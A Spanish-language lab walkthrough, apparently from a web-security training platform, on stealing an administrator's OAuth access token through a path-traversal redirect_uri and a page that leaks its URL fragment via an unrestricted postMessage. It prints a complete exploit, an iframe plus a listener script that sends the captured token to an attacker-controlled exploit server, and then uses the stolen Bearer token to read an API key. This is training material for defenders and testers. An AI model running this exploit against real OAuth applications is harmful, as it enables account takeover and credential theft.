# 🔁 **Robo de tokens de acceso OAuth a través de una página proxy**

## 📄 **Descripción del laboratorio**

Este laboratorio utiliza un servicio OAuth para permitir a los usuarios iniciar sesión con su cuenta de redes sociales.\
Una validación defectuosa por parte del servicio OAuth permite filtrar **tokens de acceso** a rutas arbitrarias dentro de la aplicación cliente. Además, una **vulnerabilidad secundaria** en dicha aplicación actúa como **proxy involuntario**, permitiendo al atacante robar el token del usuario administrador.

🎯 **Objetivo:**\
Robar el **access token OAuth del administrador**, usarlo para obtener su **API key** y enviarla como solución.

Condiciones del laboratorio:

* El administrador:
  * Tiene sesión activa en el proveedor OAuth
  * Abrirá cualquier contenido enviado desde el Exploit Server
* No es posible obtener la API key simplemente iniciando sesión como admin
* Credenciales sociales del atacante:

```
wiener : peter
```



## 📚 Teoría

En este laboratorio seguimos trabajando con OAuth usando el **Implicit Flow** (`response_type=token`), pero el vector principal ya no es una redirección abierta clásica, sino una **página interna vulnerable que actúa como intermediaria (proxy)**.

### 📌 Flujo OAuth implicado

En el implicit flow, el proveedor OAuth devuelve el token directamente en el fragmento de la URL:

```
#access_token=...
```

Características importantes del fragmento (`#`):

* No se envía al servidor
* Solo existe en el navegador
* Puede ser leído por JavaScript
* No aparece en logs HTTP si no se transforma explícitamente

### 📌 Fallos que se combinan en este laboratorio

1. **Validación defectuosa del `redirect_uri`**
   * El proveedor OAuth permite _path traversal_ (`/../`)
   * El flujo puede terminar en rutas internas arbitrarias del mismo dominio
2.  **Uso inseguro de `window.postMessage()`**

    * Una página interna (`/post/comment/comment-form`) envía:



    ```
    window.location.href
    ```



al `parent`

* Usa `targetOrigin: '*'`
* Cualquier origen puede recibir el mensaje

Esto convierte esa página en un **proxy perfecto** para filtrar fragmentos de URL (incluido `#access_token`).



## 📝 Práctica

### 1️⃣ Analizar el flujo OAuth normal

Iniciamos sesión usando OAuth con:

```
wiener : peter
```

Interceptamos el flujo con Burp y confirmamos que se utiliza:

```
response_type=token
```

y que el proveedor OAuth devuelve el token en el fragmento.

También confirmamos que el `redirect_uri` permite path traversal (`/../`), igual que en laboratorios anteriores.

### 2️⃣ Auditar la aplicación cliente

Revisando las páginas del blog, observamos que cada entrada carga un **iframe** con el formulario de comentarios:

```
/post/comment/comment-form
```

<img width="1330" height="95" alt="image" src="https://github.com/user-attachments/assets/ad610b2e-65ae-4759-923d-923547c26814" />
<br>
Inspeccionamos el código JavaScript del formulario y encontramos lo siguiente:

```html
<script>
parent.postMessage({type: 'onload', data: window.location.href}, '*')
function submitForm(form, ev) {
ev.preventDefault();
const formData = new FormData(document.getElementById("comment-form"));
const hashParams = new URLSearchParams(window.location.hash.substr(1));
const o = {}; formData.forEach((v, k) => o[k] = v);
hashParams.forEach((v, k) => o[k] = v);
parent.postMessage({type: 'oncomment', content: o}, '*');
form.reset();
}
</script>
```

📌 Puntos críticos:

* Se envía `window.location.href` al `parent`
* Incluye el fragmento (`#access_token`)
* `targetOrigin` es `'*'` → **sin restricción de origen**

Página vulnerable identificada.



### 3️⃣ Preparar el vector OAuth + proxy

La idea es clara:

1. Forzar que el flujo OAuth termine en:

```
/post/comment/comment-form
```

1. El formulario se carga dentro de un iframe
2. Envía la URL completa (con `#access_token`) al `parent`
3. Nuestro exploit escucha el `postMessage`
4. Exfiltramos el token a los logs del Exploit Server



### 4️⃣ Construir la URL OAuth maliciosa

Copiamos desde Burp la URL original del endpoint `/auth`:

```
https://oauth-XXXX.oauth-server.net/auth?client_id=...&redirect_uri=...
```

Modificamos el `redirect_uri` usando path traversal para apuntar al formulario vulnerable:

```
https://ID-LAB.web-security-academy.net/oauth-callback/../post/comment/comment-form
```

La URL final queda así (simplificada):

```
https://oauth-XXXX.oauth-server.net/auth?
client_id=...
&redirect_uri=https://ID-LAB.web-security-academy.net/oauth-callback/../post/comment/comment-form
&response_type=token
&scope=openid profile email
```



### 5️⃣ Construir el exploit final

En el **Exploit Server** creamos el siguiente contenido:

```html
<iframe src="https://oauth-XXXX.oauth-server.net/auth?client_id=...&redirect_uri=https://ID-LAB.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&scope=openid%20profile%20email"></iframe>

<script>
window.addEventListener('message', function(e) {
    fetch('/' + encodeURIComponent(e.data.data));
}, false);
</script>
```

<img width="1333" height="427" alt="image" src="https://github.com/user-attachments/assets/bea71709-8677-46cf-8de4-02053ab4165a" />
<br>
📌 Qué hace este exploit:

* El iframe ejecuta el flujo OAuth
* El token queda en el fragmento
* El formulario lo envía al `parent` con `postMessage`
* Nuestro script captura el mensaje
* Lo reenvía como petición GET al Exploit Server (para loguearlo)



### 6️⃣ Robo del access token del administrador

Pulsamos:

* **Store**
* **Deliver exploit to victim**

El administrador abre el exploit:

* Tiene sesión activa con el proveedor OAuth
* El flujo se completa automáticamente
* El formulario envía la URL completa con:

```
#access_token=ADMIN-TOKEN
```

En los **Access logs** del Exploit Server vemos una petición del tipo:

```
GET /https%3A%2F%2FID-LAB...%23access_token%3DADMIN-TOKEN
```

<img width="932" height="32" alt="image" src="https://github.com/user-attachments/assets/41bb1790-477a-46cb-b964-8ee3b0e65e5e" />
<br>
📌 Extraemos el `ADMIN-TOKEN`.



### 7️⃣ Obtener la API key del administrador

Usamos el token robado contra el endpoint expuesto:

```
GET /me
Authorization: Bearer ADMIN-TOKEN
```

La respuesta contiene los datos del administrador, incluyendo su **API key**.

### 8️⃣ Resolver el laboratorio

Copiamos la API key y la enviamos usando el botón de solución del banner del laboratorio.
